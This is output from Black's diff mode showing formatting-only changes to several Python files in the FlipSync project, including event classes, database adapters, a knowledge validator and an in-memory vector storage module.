@@ -179,76 +188,76 @@
                 for field in required:
                     if field not in knowledge.content:
                         raise ValidationError(
                             f"Required field '{field}' is missing",
                             knowledge_id=knowledge.knowledge_id,
-                            field=field
+                            field=field,
                         )
-                
+
                 # Check field types
                 properties = schema.get("properties", {})
                 for field, value in knowledge.content.items():
                     if field in properties:
                         field_type = properties[field].get("type")
                         if field_type == "string" and not isinstance(value, str):
                             raise ValidationError(
                                 f"Field '{field}' should be a string",
                                 knowledge_id=knowledge.knowledge_id,
-                                field=field
-                            )
-                        elif field_type == "number" and not isinstance(value, (int, float)):
+                                field=field,
+                            )
+                        elif field_type == "number" and not isinstance(
+                            value, (int, float)
+                        ):
                             raise ValidationError(
                                 f"Field '{field}' should be a number",
                                 knowledge_id=knowledge.knowledge_id,
-                                field=field
+                                field=field,
                             )
                         elif field_type == "boolean" and not isinstance(value, bool):
                             raise ValidationError(
                                 f"Field '{field}' should be a boolean",
                                 knowledge_id=knowledge.knowledge_id,
-                                field=field
+                                field=field,
                             )
                         elif field_type == "array" and not isinstance(value, list):
                             raise ValidationError(
                                 f"Field '{field}' should be an array",
                                 knowledge_id=knowledge.knowledge_id,
-                                field=field
+                                field=field,
                             )
                         elif field_type == "object" and not isinstance(value, dict):
                             raise ValidationError(
                                 f"Field '{field}' should be an object",
                                 knowledge_id=knowledge.knowledge_id,
-                                field=field
-                            )
-            
+                                field=field,
+                            )
+
             return True
         except ValidationError:
             # Re-raise validation errors
             raise
         except Exception as e:
             error_msg = f"Failed to validate knowledge item: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise ValidationError(
-                error_msg,
-                knowledge_id=knowledge.knowledge_id,
-                cause=e
+                error_msg, knowledge_id=knowledge.knowledge_id, cause=e
             )
-    
+
     async def validate_batch(self, knowledge_items: List[KnowledgeItem]) -> List[bool]:
         """
         Validate multiple knowledge items.
-        
+
         Args:
             knowledge_items: Knowledge items to validate
-            
+
         Returns:
             List of validation results (True for valid, False for invalid)
         """
         results = []
         for knowledge in knowledge_items:
             try:
                 valid = await self.validate(knowledge)
                 results.append(valid)
             except ValidationError:
                 results.append(False)
-        
+
         return results
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_validator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/event.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/event.py	2025-06-19 04:03:50.918401+00:00
@@ -21,19 +21,20 @@
 from dataclasses import dataclass, field
 from datetime import datetime
 from typing import Any, Dict, List, Optional, Set, Type, TypeVar, Union
 
 # Type variable for event types
-T = TypeVar('T', bound='Event')
+T = TypeVar("T", bound="Event")
 
 
 class EventPriority(enum.IntEnum):
     """
     Priority levels for events.
 
     Higher values indicate higher priority.
     """
+
     LOW = 0
     NORMAL = 1
     HIGH = 2
     URGENT = 3
     CRITICAL = 4
@@ -41,10 +42,11 @@
 
 class EventType(enum.Enum):
     """
     Core event types in the system.
     """
+
     COMMAND = "command"  # Directive to perform an action
     NOTIFICATION = "notification"  # Information about a state change
     QUERY = "query"  # Request for information
     RESPONSE = "response"  # Reply to a query
     ERROR = "error"  # Error notification
@@ -52,10 +54,11 @@
 
 class EventStatus(enum.Enum):
     """
     Status of an event in its lifecycle.
     """
+
     CREATED = "created"  # Event has been created but not published
     PUBLISHED = "published"  # Event has been published to the event bus
     DELIVERED = "delivered"  # Event has been delivered to subscribers
     PROCESSING = "processing"  # Event is being processed by subscribers
     COMPLETED = "completed"  # Event has been fully processed
@@ -68,10 +71,11 @@
     """
     Metadata for events.
 
     Contains information about the event itself, not its payload.
     """
+
     # Core identification
     event_id: str = field(default_factory=lambda: str(uuid.uuid4()))
     correlation_id: Optional[str] = None
     causation_id: Optional[str] = None
 
@@ -151,21 +155,23 @@
             result["custom"] = self.custom
 
         return result
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'EventMetadata':
+    def from_dict(cls, data: Dict[str, Any]) -> "EventMetadata":
         """Create metadata from dictionary."""
         # Handle required fields with appropriate conversions
         metadata = cls(
             event_id=data.get("event_id", str(uuid.uuid4())),
             event_type=EventType(data.get("event_type", EventType.NOTIFICATION.value)),
             event_name=data.get("event_name", ""),
             version=data.get("version", "1.0"),
             source=data.get("source", ""),
             priority=EventPriority(data.get("priority", EventPriority.NORMAL.value)),
-            created_at=datetime.fromisoformat(data.get("created_at", datetime.now().isoformat())),
+            created_at=datetime.fromisoformat(
+                data.get("created_at", datetime.now().isoformat())
+            ),
             status=EventStatus(data.get("status", EventStatus.CREATED.value)),
             retry_count=data.get("retry_count", 0),
             max_retries=data.get("max_retries", 3),
             is_compressed=data.get("is_compressed", False),
         )
@@ -205,14 +211,11 @@
     in the FlipSync system. They represent discrete pieces of information that
     can be published, routed, and consumed asynchronously.
     """
 
     def __init__(
-        self,
-        payload: Any = None,
-        metadata: Optional[EventMetadata] = None,
-        **kwargs
+        self, payload: Any = None, metadata: Optional[EventMetadata] = None, **kwargs
     ):
         """
         Initialize a new event.
 
         Args:
@@ -400,11 +403,11 @@
     def __init__(
         self,
         command_name: str,
         parameters: Dict[str, Any] = None,
         target: Optional[str] = None,
-        **kwargs
+        **kwargs,
     ):
         """
         Initialize a command event.
 
         Args:
@@ -426,23 +429,19 @@
         )
 
         super().__init__(payload=payload, metadata=metadata, **kwargs)
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'CommandEvent':
+    def from_dict(cls, data: Dict[str, Any]) -> "CommandEvent":
         """Create a command event from a dictionary."""
         metadata = EventMetadata.from_dict(data.get("metadata", {}))
         payload = data.get("payload", {})
 
         command_name = payload.get("command_name", "")
         parameters = payload.get("parameters", {})
 
-        return cls(
-            command_name=command_name,
-            parameters=parameters,
-            metadata=metadata
-        )
+        return cls(command_name=command_name, parameters=parameters, metadata=metadata)
 
     @property
     def command_name(self) -> str:
         """Get the command name."""
         return self.payload.get("command_name", "")
@@ -468,16 +467,11 @@
     Event representing a notification of a state change.
 
     Notifications inform subscribers about changes in the system state.
     """
 
-    def __init__(
-        self,
-        notification_name: str,
-        data: Dict[str, Any] = None,
-        **kwargs
-    ):
+    def __init__(self, notification_name: str, data: Dict[str, Any] = None, **kwargs):
         """
         Initialize a notification event.
 
         Args:
             notification_name: Name of the notification
@@ -496,22 +490,22 @@
         )
 
         super().__init__(payload=payload, metadata=metadata, **kwargs)
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'NotificationEvent':
+    def from_dict(cls, data: Dict[str, Any]) -> "NotificationEvent":
         """Create a notification event from a dictionary."""
         metadata = EventMetadata.from_dict(data.get("metadata", {}))
         payload = data.get("payload", {})
 
         notification_name = payload.get("notification_name", "")
         notification_data = payload.get("data", {})
 
         return cls(
             notification_name=notification_name,
             data=notification_data,
-            metadata=metadata
+            metadata=metadata,
         )
 
     @property
     def notification_name(self) -> str:
         """Get the notification name."""
@@ -533,11 +527,11 @@
     def __init__(
         self,
         query_name: str,
         parameters: Dict[str, Any] = None,
         target: Optional[str] = None,
-        **kwargs
+        **kwargs,
     ):
         """
         Initialize a query event.
 
         Args:
@@ -559,23 +553,19 @@
         )
 
         super().__init__(payload=payload, metadata=metadata, **kwargs)
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'QueryEvent':
+    def from_dict(cls, data: Dict[str, Any]) -> "QueryEvent":
         """Create a query event from a dictionary."""
         metadata = EventMetadata.from_dict(data.get("metadata", {}))
         payload = data.get("payload", {})
 
         query_name = payload.get("query_name", "")
         parameters = payload.get("parameters", {})
 
-        return cls(
-            query_name=query_name,
-            parameters=parameters,
-            metadata=metadata
-        )
+        return cls(query_name=query_name, parameters=parameters, metadata=metadata)
 
     @property
     def query_name(self) -> str:
         """Get the query name."""
         return self.payload.get("query_name", "")
@@ -607,11 +597,11 @@
         self,
         query_id: str,
         response_data: Any = None,
         is_success: bool = True,
         error_message: Optional[str] = None,
-        **kwargs
+        **kwargs,
     ):
         """
         Initialize a response event.
 
         Args:
@@ -636,11 +626,11 @@
         )
 
         super().__init__(payload=payload, metadata=metadata, **kwargs)
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'ResponseEvent':
+    def from_dict(cls, data: Dict[str, Any]) -> "ResponseEvent":
         """Create a response event from a dictionary."""
         metadata = EventMetadata.from_dict(data.get("metadata", {}))
         payload = data.get("payload", {})
 
         query_id = payload.get("query_id", "")
@@ -651,11 +641,11 @@
         return cls(
             query_id=query_id,
             response_data=response_data,
             is_success=is_success,
             error_message=error_message,
-            metadata=metadata
+            metadata=metadata,
         )
 
     @property
     def query_id(self) -> str:
         """Get the query ID."""
@@ -688,11 +678,11 @@
         self,
         error_code: str,
         error_message: str,
         source_event_id: Optional[str] = None,
         details: Dict[str, Any] = None,
-        **kwargs
+        **kwargs,
     ):
         """
         Initialize an error event.
 
         Args:
@@ -717,11 +707,11 @@
         )
 
         super().__init__(payload=payload, metadata=metadata, **kwargs)
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'ErrorEvent':
+    def from_dict(cls, data: Dict[str, Any]) -> "ErrorEvent":
         """Create an error event from a dictionary."""
         metadata = EventMetadata.from_dict(data.get("metadata", {}))
         payload = data.get("payload", {})
 
         error_code = payload.get("error_code", "")
@@ -732,11 +722,11 @@
         return cls(
             error_code=error_code,
             error_message=error_message,
             source_event_id=source_event_id,
             details=details,
-            metadata=metadata
+            metadata=metadata,
         )
 
     @property
     def error_code(self) -> str:
         """Get the error code."""
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/event.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/db/marketplace_repository.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/db/marketplace_repository.py	2025-06-19 04:03:51.005855+00:00
@@ -21,11 +21,13 @@
         Args:
             session: SQLAlchemy async session
         """
         self.session = session
 
-    async def create_marketplace(self, marketplace_data: Dict[str, Any]) -> MarketplaceModel:
+    async def create_marketplace(
+        self, marketplace_data: Dict[str, Any]
+    ) -> MarketplaceModel:
         """Create a new marketplace.
 
         Args:
             marketplace_data: Marketplace data
 
@@ -44,11 +46,13 @@
         await self.session.commit()
         await self.session.refresh(marketplace_model)
 
         return marketplace_model
 
-    async def get_marketplace_by_id(self, marketplace_id: str) -> Optional[MarketplaceModel]:
+    async def get_marketplace_by_id(
+        self, marketplace_id: str
+    ) -> Optional[MarketplaceModel]:
         """Get a marketplace by ID.
 
         Args:
             marketplace_id: Marketplace ID
 
@@ -119,6 +123,6 @@
             delete(MarketplaceModel).where(MarketplaceModel.id == marketplace_id)
         )
         await self.session.commit()
 
         # Check if any rows were deleted
-        return result.rowcount > 0 if hasattr(result, 'rowcount') else True
+        return result.rowcount > 0 if hasattr(result, "rowcount") else True
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/db/marketplace_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/error_handling/__init__.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/error_handling/__init__.py	2025-06-19 04:03:51.080297+00:00
@@ -9,16 +9,16 @@
     StandardErrorHandler,
     ErrorSeverity,
     ErrorCategory,
     get_global_error_handler,
     handle_agent_error,
-    create_validation_error
+    create_validation_error,
 )
 
 __all__ = [
     "StandardErrorHandler",
-    "ErrorSeverity", 
+    "ErrorSeverity",
     "ErrorCategory",
     "get_global_error_handler",
     "handle_agent_error",
-    "create_validation_error"
+    "create_validation_error",
 ]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/error_handling/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_database.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_database.py	2025-06-19 04:03:51.223910+00:00
@@ -70,14 +70,18 @@
         logger.error(f"Error fetching all: {e}")
         return False
 
     # Test execute
     try:
-        result = await db.execute("CREATE TABLE IF NOT EXISTS test (id INTEGER PRIMARY KEY, name TEXT)")
+        result = await db.execute(
+            "CREATE TABLE IF NOT EXISTS test (id INTEGER PRIMARY KEY, name TEXT)"
+        )
         logger.info("Created test table")
 
-        result = await db.execute("INSERT INTO test (name) VALUES (:name)", {"name": "Test"})
+        result = await db.execute(
+            "INSERT INTO test (name) VALUES (:name)", {"name": "Test"}
+        )
         logger.info("Inserted test record")
 
         result = await db.fetch_all("SELECT * FROM test")
         logger.info(f"Test records: {result}")
     except Exception as e:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_database.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/db/database_adapter.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/db/database_adapter.py	2025-06-19 04:03:51.366129+00:00
@@ -18,11 +18,11 @@
 
 
 class DatabaseAdapter:
     """
     Adapter for the real database implementation.
-    
+
     This class provides the same interface as the InMemoryDatabase class
     but uses the real database implementation under the hood.
     """
 
     def __init__(
@@ -32,11 +32,11 @@
         pool_size: int = 5,
         max_overflow: int = 10,
         echo: bool = False,
     ):
         """Initialize the database adapter.
-        
+
         Args:
             config_manager: Optional configuration manager
             connection_string: Optional database connection string
             pool_size: Connection pool size
             max_overflow: Maximum number of connections to allow in addition to pool_size
@@ -83,11 +83,11 @@
         if args:
             for i, arg in enumerate(args):
                 params[f"param_{i}"] = arg
         if kwargs:
             params.update(kwargs)
-        
+
         return await self.database.execute(query, params)
 
     async def fetch_one(self, query: str, *args, **kwargs) -> Optional[Dict[str, Any]]:
         """Fetch a single row from a query.
 
@@ -103,11 +103,11 @@
         if args:
             for i, arg in enumerate(args):
                 params[f"param_{i}"] = arg
         if kwargs:
             params.update(kwargs)
-        
+
         return await self.database.fetch_one(query, params)
 
     async def fetch_all(self, query: str, *args, **kwargs) -> List[Dict[str, Any]]:
         """Fetch all rows from a query.
 
@@ -123,11 +123,11 @@
         if args:
             for i, arg in enumerate(args):
                 params[f"param_{i}"] = arg
         if kwargs:
             params.update(kwargs)
-        
+
         return await self.database.fetch_all(query, params)
 
     @property
     def is_connected(self) -> bool:
         """Check if the database is connected.
@@ -178,18 +178,18 @@
 
 
 class SessionAdapter:
     """
     Adapter for the real database session.
-    
+
     This class provides the same interface as the InMemorySessionContext class
     but uses the real database session under the hood.
     """
 
     def __init__(self, session):
         """Initialize the session adapter.
-        
+
         Args:
             session: The database session
         """
         self.session = session
         logger.debug("SessionAdapter initialized")
@@ -211,18 +211,18 @@
             query: SQL query to execute
             *args: Positional arguments for the query
             **kwargs: Keyword arguments for the query
         """
         from sqlalchemy import text
-        
-        params = {}
-        if args:
-            for i, arg in enumerate(args):
-                params[f"param_{i}"] = arg
-        if kwargs:
-            params.update(kwargs)
-        
+
+        params = {}
+        if args:
+            for i, arg in enumerate(args):
+                params[f"param_{i}"] = arg
+        if kwargs:
+            params.update(kwargs)
+
         await self.session.execute(text(query), params)
         await self.session.commit()
 
     async def fetch_one(self, query: str, *args, **kwargs) -> Optional[Dict[str, Any]]:
         """Fetch a single row from a query.
@@ -234,24 +234,24 @@
 
         Returns:
             A single row or None if no rows are found
         """
         from sqlalchemy import text
-        
-        params = {}
-        if args:
-            for i, arg in enumerate(args):
-                params[f"param_{i}"] = arg
-        if kwargs:
-            params.update(kwargs)
-        
+
+        params = {}
+        if args:
+            for i, arg in enumerate(args):
+                params[f"param_{i}"] = arg
+        if kwargs:
+            params.update(kwargs)
+
         result = await self.session.execute(text(query), params)
         row = result.fetchone()
-        
+
         if not row:
             return None
-            
+
         # Convert row to dict
         try:
             if hasattr(row, "_mapping"):
                 return dict(row._mapping)
             return dict(row)
@@ -272,18 +272,18 @@
 
         Returns:
             A list of rows
         """
         from sqlalchemy import text
-        
-        params = {}
-        if args:
-            for i, arg in enumerate(args):
-                params[f"param_{i}"] = arg
-        if kwargs:
-            params.update(kwargs)
-        
+
+        params = {}
+        if args:
+            for i, arg in enumerate(args):
+                params[f"param_{i}"] = arg
+        if kwargs:
+            params.update(kwargs)
+
         result = await self.session.execute(text(query), params)
         return [dict(row._mapping) for row in result]
 
     def add(self, obj: Any) -> None:
         """Add an object to the session.
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/db/database_adapter.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/vector_storage.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/vector_storage.py	2025-06-19 04:03:51.382628+00:00
@@ -15,517 +15,535 @@
 from fs_agt_clean.core.monitoring import get_logger
 
 
 class VectorStorageError(Exception):
     """Base exception for vector storage errors."""
-    
+
     def __init__(
         self,
         message: str,
         item_id: Optional[str] = None,
-        cause: Optional[Exception] = None
+        cause: Optional[Exception] = None,
     ):
         """
         Initialize a vector storage error.
-        
+
         Args:
             message: Error message
             item_id: ID of the item related to the error
             cause: Original exception that caused this error
         """
         self.message = message
         self.item_id = item_id
         self.cause = cause
-        
+
         # Create a detailed error message
         detailed_message = message
         if item_id:
             detailed_message += f" (item_id: {item_id})"
         if cause:
             detailed_message += f" - caused by: {str(cause)}"
-        
+
         super().__init__(detailed_message)
 
 
 class VectorStorage(abc.ABC):
     """
     Interface for vector storage.
-    
+
     Vector storage stores and retrieves vector representations of items,
     enabling similarity search and other vector-based operations.
     """
-    
-    @abc.abstractmethod
-    async def add_vector(self, item_id: str, vector: np.ndarray, metadata: Optional[Dict[str, Any]] = None) -> None:
+
+    @abc.abstractmethod
+    async def add_vector(
+        self,
+        item_id: str,
+        vector: np.ndarray,
+        metadata: Optional[Dict[str, Any]] = None,
+    ) -> None:
         """
         Add a vector to the storage.
-        
+
         Args:
             item_id: ID of the item
             vector: Vector representation of the item
             metadata: Additional metadata about the item
-            
+
         Raises:
             VectorStorageError: If the vector cannot be added
         """
         pass
-    
-    @abc.abstractmethod
-    async def update_vector(self, item_id: str, vector: np.ndarray, metadata: Optional[Dict[str, Any]] = None) -> None:
+
+    @abc.abstractmethod
+    async def update_vector(
+        self,
+        item_id: str,
+        vector: np.ndarray,
+        metadata: Optional[Dict[str, Any]] = None,
+    ) -> None:
         """
         Update a vector in the storage.
-        
+
         Args:
             item_id: ID of the item
             vector: New vector representation of the item
             metadata: New or updated metadata about the item
-            
+
         Raises:
             VectorStorageError: If the vector cannot be updated
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_vector(self, item_id: str) -> Optional[np.ndarray]:
         """
         Get a vector by item ID.
-        
-        Args:
-            item_id: ID of the item
-            
+
+        Args:
+            item_id: ID of the item
+
         Returns:
             Vector representation of the item, or None if not found
-            
+
         Raises:
             VectorStorageError: If the vector cannot be retrieved
         """
         pass
-    
+
     @abc.abstractmethod
     async def delete_vector(self, item_id: str) -> bool:
         """
         Delete a vector from the storage.
-        
-        Args:
-            item_id: ID of the item
-            
+
+        Args:
+            item_id: ID of the item
+
         Returns:
             True if the vector was deleted
-            
+
         Raises:
             VectorStorageError: If the vector cannot be deleted
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_metadata(self, item_id: str) -> Optional[Dict[str, Any]]:
         """
         Get metadata for an item.
-        
-        Args:
-            item_id: ID of the item
-            
+
+        Args:
+            item_id: ID of the item
+
         Returns:
             Metadata for the item, or None if not found
-            
+
         Raises:
             VectorStorageError: If the metadata cannot be retrieved
         """
         pass
-    
+
     @abc.abstractmethod
     async def update_metadata(self, item_id: str, metadata: Dict[str, Any]) -> None:
         """
         Update metadata for an item.
-        
+
         Args:
             item_id: ID of the item
             metadata: New or updated metadata
-            
+
         Raises:
             VectorStorageError: If the metadata cannot be updated
         """
         pass
-    
-    @abc.abstractmethod
-    async def search_by_vector(self, query_vector: np.ndarray, limit: int = 10) -> List[Tuple[str, float]]:
+
+    @abc.abstractmethod
+    async def search_by_vector(
+        self, query_vector: np.ndarray, limit: int = 10
+    ) -> List[Tuple[str, float]]:
         """
         Search for items by similarity to a query vector.
-        
+
         Args:
             query_vector: Query vector
             limit: Maximum number of results
-            
+
         Returns:
             List of (item_id, similarity score) tuples
-            
+
         Raises:
             VectorStorageError: If the search cannot be performed
         """
         pass
-    
-    @abc.abstractmethod
-    async def search_by_id(self, item_id: str, limit: int = 10) -> List[Tuple[str, float]]:
+
+    @abc.abstractmethod
+    async def search_by_id(
+        self, item_id: str, limit: int = 10
+    ) -> List[Tuple[str, float]]:
         """
         Search for items similar to a given item.
-        
+
         Args:
             item_id: ID of the item
             limit: Maximum number of results
-            
+
         Returns:
             List of (item_id, similarity score) tuples
-            
+
         Raises:
             VectorStorageError: If the search cannot be performed
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_all_ids(self) -> List[str]:
         """
         Get all item IDs in the storage.
-        
+
         Returns:
             List of all item IDs
-            
+
         Raises:
             VectorStorageError: If the IDs cannot be retrieved
         """
         pass
-    
+
     @abc.abstractmethod
     async def get_count(self) -> int:
         """
         Get the number of items in the storage.
-        
+
         Returns:
             Number of items
-            
+
         Raises:
             VectorStorageError: If the count cannot be retrieved
         """
         pass
-    
+
     @abc.abstractmethod
     async def clear(self) -> None:
         """
         Clear all items from the storage.
-        
+
         Raises:
             VectorStorageError: If the storage cannot be cleared
         """
         pass
 
 
 class InMemoryVectorStorage(VectorStorage):
     """
     In-memory implementation of vector storage.
-    
+
     This implementation stores vectors and metadata in memory, providing
     efficient similarity search using cosine similarity.
     """
-    
+
     def __init__(self, storage_id: str):
         """
         Initialize in-memory vector storage.
-        
+
         Args:
             storage_id: Unique identifier for this storage
         """
         self.storage_id = storage_id
         self.logger = get_logger(f"vector_storage.{storage_id}")
-        
+
         # Initialize storage
         self.vectors: Dict[str, np.ndarray] = {}
         self.metadata: Dict[str, Dict[str, Any]] = {}
-    
-    async def add_vector(self, item_id: str, vector: np.ndarray, metadata: Optional[Dict[str, Any]] = None) -> None:
+
+    async def add_vector(
+        self,
+        item_id: str,
+        vector: np.ndarray,
+        metadata: Optional[Dict[str, Any]] = None,
+    ) -> None:
         """
         Add a vector to the storage.
-        
+
         Args:
             item_id: ID of the item
             vector: Vector representation of the item
             metadata: Additional metadata about the item
-            
+
         Raises:
             VectorStorageError: If the vector cannot be added
         """
         try:
             # Check if the item already exists
             if item_id in self.vectors:
                 raise VectorStorageError(
-                    f"Item already exists: {item_id}",
-                    item_id=item_id
+                    f"Item already exists: {item_id}", item_id=item_id
                 )
-            
+
             # Normalize the vector for cosine similarity
             normalized_vector = self._normalize_vector(vector)
-            
+
             # Store the vector and metadata
             self.vectors[item_id] = normalized_vector
             self.metadata[item_id] = metadata or {}
-            
+
             self.logger.debug(f"Added vector for item: {item_id}")
         except VectorStorageError:
             # Re-raise vector storage errors
             raise
         except Exception as e:
             error_msg = f"Failed to add vector for item {item_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, item_id=item_id, cause=e)
-    
-    async def update_vector(self, item_id: str, vector: np.ndarray, metadata: Optional[Dict[str, Any]] = None) -> None:
+
+    async def update_vector(
+        self,
+        item_id: str,
+        vector: np.ndarray,
+        metadata: Optional[Dict[str, Any]] = None,
+    ) -> None:
         """
         Update a vector in the storage.
-        
+
         Args:
             item_id: ID of the item
             vector: New vector representation of the item
             metadata: New or updated metadata about the item
-            
+
         Raises:
             VectorStorageError: If the vector cannot be updated
         """
         try:
             # Check if the item exists
             if item_id not in self.vectors:
-                raise VectorStorageError(
-                    f"Item not found: {item_id}",
-                    item_id=item_id
-                )
-            
+                raise VectorStorageError(f"Item not found: {item_id}", item_id=item_id)
+
             # Normalize the vector for cosine similarity
             normalized_vector = self._normalize_vector(vector)
-            
+
             # Update the vector
             self.vectors[item_id] = normalized_vector
-            
+
             # Update the metadata if provided
             if metadata is not None:
                 self.metadata[item_id] = metadata
-            
+
             self.logger.debug(f"Updated vector for item: {item_id}")
         except VectorStorageError:
             # Re-raise vector storage errors
             raise
         except Exception as e:
             error_msg = f"Failed to update vector for item {item_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, item_id=item_id, cause=e)
-    
+
     async def get_vector(self, item_id: str) -> Optional[np.ndarray]:
         """
         Get a vector by item ID.
-        
-        Args:
-            item_id: ID of the item
-            
+
+        Args:
+            item_id: ID of the item
+
         Returns:
             Vector representation of the item, or None if not found
-            
+
         Raises:
             VectorStorageError: If the vector cannot be retrieved
         """
         try:
             # Return the vector if it exists
             return self.vectors.get(item_id)
         except Exception as e:
             error_msg = f"Failed to get vector for item {item_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, item_id=item_id, cause=e)
-    
+
     async def delete_vector(self, item_id: str) -> bool:
         """
         Delete a vector from the storage.
-        
-        Args:
-            item_id: ID of the item
-            
+
+        Args:
+            item_id: ID of the item
+
         Returns:
             True if the vector was deleted
-            
+
         Raises:
             VectorStorageError: If the vector cannot be deleted
         """
         try:
             # Check if the item exists
             if item_id not in self.vectors:
                 return False
-            
+
             # Delete the vector and metadata
             del self.vectors[item_id]
             del self.metadata[item_id]
-            
+
             self.logger.debug(f"Deleted vector for item: {item_id}")
             return True
         except Exception as e:
             error_msg = f"Failed to delete vector for item {item_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, item_id=item_id, cause=e)
-    
+
     async def get_metadata(self, item_id: str) -> Optional[Dict[str, Any]]:
         """
         Get metadata for an item.
-        
-        Args:
-            item_id: ID of the item
-            
+
+        Args:
+            item_id: ID of the item
+
         Returns:
             Metadata for the item, or None if not found
-            
+
         Raises:
             VectorStorageError: If the metadata cannot be retrieved
         """
         try:
             # Return the metadata if it exists
             return self.metadata.get(item_id)
         except Exception as e:
             error_msg = f"Failed to get metadata for item {item_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, item_id=item_id, cause=e)
-    
+
     async def update_metadata(self, item_id: str, metadata: Dict[str, Any]) -> None:
         """
         Update metadata for an item.
-        
+
         Args:
             item_id: ID of the item
             metadata: New or updated metadata
-            
+
         Raises:
             VectorStorageError: If the metadata cannot be updated
         """
         try:
             # Check if the item exists
             if item_id not in self.vectors:
-                raise VectorStorageError(
-                    f"Item not found: {item_id}",
-                    item_id=item_id
-                )
-            
+                raise VectorStorageError(f"Item not found: {item_id}", item_id=item_id)
+
             # Update the metadata
             self.metadata[item_id] = metadata
-            
+
             self.logger.debug(f"Updated metadata for item: {item_id}")
         except VectorStorageError:
             # Re-raise vector storage errors
             raise
         except Exception as e:
             error_msg = f"Failed to update metadata for item {item_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, item_id=item_id, cause=e)
-    
-    async def search_by_vector(self, query_vector: np.ndarray, limit: int = 10) -> List[Tuple[str, float]]:
+
+    async def search_by_vector(
+        self, query_vector: np.ndarray, limit: int = 10
+    ) -> List[Tuple[str, float]]:
         """
         Search for items by similarity to a query vector.
-        
+
         Args:
             query_vector: Query vector
             limit: Maximum number of results
-            
+
         Returns:
             List of (item_id, similarity score) tuples
-            
+
         Raises:
             VectorStorageError: If the search cannot be performed
         """
         try:
             # Normalize the query vector
             normalized_query = self._normalize_vector(query_vector)
-            
+
             # Calculate similarity scores
             scores = []
             for item_id, vector in self.vectors.items():
                 similarity = self._cosine_similarity(normalized_query, vector)
                 scores.append((item_id, similarity))
-            
+
             # Sort by similarity (highest first) and limit results
             scores.sort(key=lambda x: x[1], reverse=True)
             return scores[:limit]
         except Exception as e:
             error_msg = f"Failed to search by vector: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, cause=e)
-    
-    async def search_by_id(self, item_id: str, limit: int = 10) -> List[Tuple[str, float]]:
+
+    async def search_by_id(
+        self, item_id: str, limit: int = 10
+    ) -> List[Tuple[str, float]]:
         """
         Search for items similar to a given item.
-        
+
         Args:
             item_id: ID of the item
             limit: Maximum number of results
-            
+
         Returns:
             List of (item_id, similarity score) tuples
-            
+
         Raises:
             VectorStorageError: If the search cannot be performed
         """
         try:
             # Check if the item exists
             if item_id not in self.vectors:
-                raise VectorStorageError(
-                    f"Item not found: {item_id}",
-                    item_id=item_id
-                )
-            
+                raise VectorStorageError(f"Item not found: {item_id}", item_id=item_id)
+
             # Get the vector for the item
             vector = self.vectors[item_id]
-            
+
             # Search by vector
             results = await self.search_by_vector(vector, limit + 1)
-            
+
             # Remove the item itself from the results
             return [result for result in results if result[0] != item_id][:limit]
         except VectorStorageError:
             # Re-raise vector storage errors
             raise
         except Exception as e:
             error_msg = f"Failed to search by ID {item_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, item_id=item_id, cause=e)
-    
+
     async def get_all_ids(self) -> List[str]:
         """
         Get all item IDs in the storage.
-        
+
         Returns:
             List of all item IDs
-            
+
         Raises:
             VectorStorageError: If the IDs cannot be retrieved
         """
         try:
             return list(self.vectors.keys())
         except Exception as e:
             error_msg = f"Failed to get all IDs: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, cause=e)
-    
+
     async def get_count(self) -> int:
         """
         Get the number of items in the storage.
-        
+
         Returns:
             Number of items
-            
+
         Raises:
             VectorStorageError: If the count cannot be retrieved
         """
         try:
             return len(self.vectors)
         except Exception as e:
             error_msg = f"Failed to get count: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, cause=e)
-    
+
     async def clear(self) -> None:
         """
         Clear all items from the storage.
-        
+
         Raises:
             VectorStorageError: If the storage cannot be cleared
         """
         try:
             self.vectors.clear()
@@ -533,33 +551,33 @@
